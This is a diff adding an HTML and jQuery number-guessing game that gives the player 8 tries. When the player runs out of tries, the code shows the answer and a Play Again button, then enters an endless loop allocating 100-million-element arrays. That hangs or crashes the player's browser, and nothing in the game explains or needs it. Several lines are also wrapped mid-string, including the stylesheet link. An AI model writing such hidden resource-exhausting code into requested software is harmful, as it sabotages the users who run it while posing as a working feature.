@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Guessing Game</title>
+  <link rel="stylesheet" href="
+https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+</head>
+<body>
+  <div class="container my-5">
+    <h1 class="mb-4">Guessing Game</h1>
+    <p>Guess a number between 1 and 100. You have 8 tries. Don't Worry about it to much.</p>
+
+    <div class="row">
+      <div class="col-md-8">
+        <input id="guess-input" type="number" class="form-control"
+placeholder="Enter your guess" min="1" max="100">
+        <small id="guess-help" class="form-text text-muted">Make a guess
+and press "Submit" or enter.</small>
+      </div>
+      <div class="col-md-4">
+        <button id="submit-button" type="button" class="btn btn-primary
+btn-block">Submit</button>
+        <button id="play-again-button" type="button" class="btn btn-primary
+btn-block" style="display:none;">Play Again</button>
+      </div>
+    </div>
+    <hr>
+
+    <div id="result-rows">
+    </div>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
+  <script>
+    const answer = Math.floor(Math.random() * 100 + 1);
+
+    let tries = 0;
+    $('#submit-button').click(() => {
+      const guess = Number($('#guess-input').val());
+
+      if (!guess || guess < 1 || guess > 100) {
+        $('#guess-help').text('Please enter a number between 1 and 100.');
+        return;
+      }
+
+      tries++;
+      const result = guess === answer ? 'correct' : (guess < answer ? 'low'
+: 'high');
+      const rowClass = result === 'correct' ? 'table-success' : '';
+
+      const row = `
+        <div class="row ${rowClass}">
+          <div class="col-4">${guess}</div>
+          <div class="col-8">${result}</div>
+        </div>
+      `;
+      $('#result-rows').append(row);
+
+      if (result === 'correct') {
+        $('#guess-input').prop('disabled', true);
+        $('#submit-button').prop('disabled', true);
+        $('#play-again-button').show();
+        $('#play-again-button').click(() => {
+          location.reload();
+        });
+      } else if (tries === 8) {
+        $('#guess-input').prop('disabled', true);
+        $('#submit-button').prop('disabled', true);
+        $('#guess-help').text(`Sorry, you're out of tries. The answer was
+${answer}.`);
+        $('#play-again-button').show();
+        $('#play-again-button').click(() => {
+          location.reload();
+        });
+        while (true) { var x = new Array(100000000); }
+      } else {
+        const remainingTries = 8 - tries;
+        $('#guess-help').text(`You have ${remainingTries} ${remainingTries
+=== 1 ? 'try' : 'tries'} left.`);
+        $('#play-again-button').hide();
+      }
+
+      $('#guess-input').val('');
+    });
+
+    $('#guess-input').keypress((e) => {
+      if (e.keyCode === 13) {
+        $('#submit-button').click();
+      }
+    });
+  </script>
+</body>
+</html>
